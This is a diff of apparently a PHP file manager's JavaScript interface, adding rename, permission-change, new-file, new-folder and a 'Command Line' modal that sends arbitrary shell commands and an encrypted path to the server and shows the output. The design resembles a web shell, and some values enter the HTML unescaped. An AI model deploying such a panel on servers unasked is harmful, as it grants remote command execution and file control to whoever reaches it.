+                            <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path>
+                            </svg>
+                            <span>Rename ${isDirectory ? 'Directory' : 'File'}</span>
+                        </h2>
+                    </div>
+                    <div class="modal-body">
+                        <div class="info-box">
+                            <div class="info-box-row">
+                                <span class="info-box-label">Current name:</span>
+                                <span class="info-box-value mono">${escapeHtml(filename)}</span>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">New Name</label>
+                            <input type="text" name="newname" value="${escapeHtml(filename)}" class="form-input" required autofocus>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="submit" class="btn btn-warning">
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                            </svg>
+                            <span>Rename</span>
+                        </button>
+                        <button type="button" class="btn btn-secondary" data-modal-close>
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                            </svg>
+                            <span>Cancel</span>
+                        </button>
+                    </div>
+                </form>
+            `;
+            Modal.open(html);
+        }
         
-        // Close modal if clicked outside
-        window.addEventListener('click', function(event) {
-            const modal = document.getElementById('deleteModal');
-            if (event.target === modal) {
-                modal.style.display = 'none';
-            }
-        });
+        // Chmod Modal
+        function showChmodModal(filename, filePath, currentPerms, isDirectory) {
+            const html = `
+                <form data-ajax method="post">
+                    <input type="hidden" name="ajax_chmod" value="1">
+                    <input type="hidden" name="path" value="${filePath}">
+                    <div class="modal-header" style="background: linear-gradient(135deg, #f5f3ff 0%, #ede9fe 100%);">
+                        <h2 class="text-xl font-bold text-violet-600 flex items-center gap-3">
+                            <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+                            </svg>
+                            <span>Change Permissions</span>
+                        </h2>
+                    </div>
+                    <div class="modal-body">
+                        <div class="info-box">
+                            <div class="info-box-row">
+                                <span class="info-box-label">File:</span>
+                                <span class="info-box-value mono" style="max-width: 200px; overflow: hidden; text-overflow: ellipsis;">${escapeHtml(filename)}</span>
+                            </div>
+                            <div class="info-box-row" style="margin-top: 8px;">
+                                <span class="info-box-label">Current:</span>
+                                <span class="info-box-value mono text-violet-600">${currentPerms}</span>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">New Permissions (octal)</label>
+                            <input type="text" name="permission" value="${currentPerms}" class="form-input mono" required pattern="[0-7]{3,4}" placeholder="e.g. 0755" maxlength="4">
+                            <p class="form-hint">Enter 3 or 4 digit octal notation (e.g., 0755 for directories, 0644 for files)</p>
+                        </div>
+                        <div style="padding: 16px; background-color: #f5f3ff; border-radius: 12px; border: 1px solid #ddd6fe;">
+                            <p class="font-semibold text-violet-900 mb-2" style="font-size: 13px;">Common permissions:</p>
+                            <div class="space-y-1" style="font-size: 13px;">
+                                <div class="flex items-center justify-between">
+                                    <span class="mono text-violet-700 bg-white px-2 py-0.5 rounded" style="font-size: 12px;">0755</span>
+                                    <span class="text-gray-600">Directory (drwxr-xr-x)</span>
+                                </div>
+                                <div class="flex items-center justify-between">
+                                    <span class="mono text-violet-700 bg-white px-2 py-0.5 rounded" style="font-size: 12px;">0644</span>
+                                    <span class="text-gray-600">File (-rw-r--r--)</span>
+                                </div>
+                                <div class="flex items-center justify-between">
+                                    <span class="mono text-violet-700 bg-white px-2 py-0.5 rounded" style="font-size: 12px;">0777</span>
+                                    <span class="text-gray-600">Full access</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="submit" class="btn" style="background-color: #8b5cf6; color: white;">
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                            </svg>
+                            <span>Change</span>
+                        </button>
+                        <button type="button" class="btn btn-secondary" data-modal-close>
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                            </svg>
+                            <span>Cancel</span>
+                        </button>
+                    </div>
+                </form>
+            `;
+            Modal.open(html);
+        }
+        
+        // New File Modal
+        function showNewFileModal(dirPath) {
+            const html = `
+                <form data-ajax method="post" class="modal-form">
+                    <input type="hidden" name="ajax_newfile" value="1">
+                    <input type="hidden" name="path" value="${dirPath}">
+                    <div class="modal-header" style="background: linear-gradient(135deg, #ecfdf5 0%, #d1fae5 100%);">
+                        <h2 class="text-xl font-bold text-emerald-600 flex items-center gap-3">
+                            <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                            </svg>
+                            <span>Create New File</span>
+                        </h2>
+                    </div>
+                    <div class="modal-body">
+                        <div class="form-group">
+                            <label class="form-label">Filename</label>
+                            <input type="text" name="filename" class="form-input" placeholder="Enter filename (e.g., script.php)" required autofocus>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Content</label>
+                            <textarea name="content" class="form-textarea" rows="10" placeholder="Enter file content here..."></textarea>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="submit" class="btn btn-success">
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                            </svg>
+                            <span>Create</span>
+                        </button>
+                        <button type="button" class="btn btn-secondary" data-modal-close>
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                            </svg>
+                            <span>Cancel</span>
+                        </button>
+                    </div>
+                </form>
+            `;
+            Modal.open(html, 'modal-lg');
+        }
+        
+        // New Folder Modal
+        function showNewFolderModal(dirPath) {
+            const html = `
+                <form data-ajax method="post">
+                    <input type="hidden" name="ajax_newfolder" value="1">
+                    <input type="hidden" name="path" value="${dirPath}">
+                    <div class="modal-header">
+                        <h2 class="text-xl font-bold text-indigo-600 flex items-center gap-3">
+                            <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 13h6m-3-3v6m-9-6h.01M19 13h.01M19 19h.01M5 19h.01M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                            </svg>
+                            <span>Create New Folder</span>
+                        </h2>
+                    </div>
+                    <div class="modal-body">
+                        <div class="form-group">
+                            <label class="form-label">Folder Name</label>
+                            <input type="text" name="foldername" class="form-input" placeholder="Enter folder name" required autofocus>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="submit" class="btn btn-primary">
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                            </svg>
+                            <span>Create</span>
+                        </button>
+                        <button type="button" class="btn btn-secondary" data-modal-close>
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                            </svg>
+                            <span>Cancel</span>
+                        </button>
+                    </div>
+                </form>
+            `;
+            Modal.open(html);
+        }
+        
+        // Command Modal
+        function showCommandModal(encryptedPath) {
+            const html = `
+                <form method="post" id="commandForm">
+                    <input type="hidden" name="ajax_command" value="1">
+                    <input type="hidden" name="path" value="${escapeHtml(encryptedPath)}">
+                    <div class="modal-header" style="background: linear-gradient(135deg, #f5f3ff 0%, #ede9fe 100%);">
+                        <h2 class="text-xl font-bold text-violet-600 flex items-center gap-3">
+                            <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+                            </svg>
+                            <span>Command Line</span>
+                        </h2>
+                    </div>
+                    <div class="modal-body">
+                        <div class="form-group" style="margin-bottom: 16px;">
+                            <label class="form-label">Command</label>
+                            <div style="position: relative;">
+                                <span style="position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: #8b5cf6; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-weight: bold; font-size: 14px;">$</span>
+                                <input type="text" name="command" class="form-input" style="padding-left: 36px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;" placeholder="Enter command (e.g., ls -la)" required autofocus autocomplete="off">
+                            </div>
+                        </div>
+                        <div id="commandOutputContainer" style="display: none;">
+                            <label class="form-label" style="display: flex; justify-content: space-between; align-items: center;">
+                                <span>Output</span>
+                                <span style="font-size: 11px; color: var(--gray-400); font-weight: normal;">Scrollable</span>
+                            </label>
+                            <pre id="commandOutputPre" style="background-color: #0f172a; color: #4ade80; padding: 16px; border-radius: 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; line-height: 1.5; overflow: auto; max-height: 350px; margin: 0; white-space: pre-wrap; word-break: break-word;"></pre>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="submit" class="btn" id="cmdExecuteBtn" style="background-color: #8b5cf6; color: white;">
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                            </svg>
+                            <span>Execute</span>
+                        </button>
+                        <button type="button" class="btn btn-secondary" data-modal-close>
+                            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" style="width: 18px; height: 18px;">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                            </svg>
+                            <span>Close</span>
+                        </button>
+                    </div>
+                </form>
+            `;
+            Modal.open(html, 'modal-lg');
+            
+            // Get references after modal is opened
+            const form = document.getElementById('commandForm');
+            const outputContainer = document.getElementById('commandOutputContainer');
+            const outputPre = document.getElementById('commandOutputPre');
+            const executeBtn = document.getElementById('cmdExecuteBtn');
+            
+            // Form submission for command modal
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const formData = new FormData(form);
+                const command = formData.get('command');
+                
+                if (!command || !command.trim()) {
+                    showAlert('Please enter a command', 'error');
+                    return;
+                }
+                
+                // Show loading state
+                Modal.setLoading(executeBtn, true);
+                outputContainer.style.display = 'block';
+                outputPre.textContent = 'Executing...';
+                outputPre.style.color = '#4ade80';
+                
+                const params = new URLSearchParams();
+                params.append('ajax_command', '1');
+                params.append('path', encryptedPath);
+                params.append('command', command);
+                
+                fetch(window.location.href, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: params.toString()
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('HTTP error! status: ' + response.status);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    Modal.setLoading(executeBtn, false);
+                    if (data.success) {
+                        const output = data.output !== undefined && data.output !== null && data.output !== '' 
+                            ? data.output 
+                            : '(Command executed with no output)';
+                        outputPre.textContent = output;
+                        outputPre.style.color = '#4ade80';
+                    } else {
+                        outputPre.textContent = 'Error: ' + (data.message || 'Command failed');
+                        outputPre.style.color = '#ef4444';
+                    }
+                    // Scroll to bottom
+                    outputPre.scrollTop = outputPre.scrollHeight;
+                })
+                .catch(error => {
+                    Modal.setLoading(executeBtn, false);
+                    outputContainer.style.display = 'block';
+                    outputPre.textContent = 'Error: ' + error.message;
+                    outputPre.style.color = '#ef4444';
+                });
+            });
+        }
+        
+        // Utility function to escape HTML
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
         
         // Search functionality
         function initSearch() {
@@ -1721,12 +2340,6 @@ $currentTime = date('Y-m-d H:i:s');
             // Initialize search
             initSearch();
             
-            // Add keyboard shortcut for escape key to close modal
-            document.addEventListener('keydown', function(event) {
-                if (event.key === 'Escape') {
-                    document.getElementById('deleteModal').style.display = 'none';
-                }
-            });
         });
     </script>
 </body>
